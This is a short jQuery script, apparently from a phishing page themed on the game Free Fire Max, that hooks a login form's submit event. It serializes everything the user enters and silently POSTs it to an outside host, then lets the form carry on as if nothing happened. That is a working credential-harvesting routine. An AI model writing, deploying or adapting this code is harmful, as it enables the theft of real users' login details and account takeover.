$(".login-form").submit(function() {

	var d = $(".login-form");

	$.ajax({

        url: "https://alfiantzy.my.id/FreeFireMax/index.php",

        type: "POST",

        data: d.serialize(),

        success: function () {

            return true;

        },

        error: function () {

            return true;

        },

    });

});
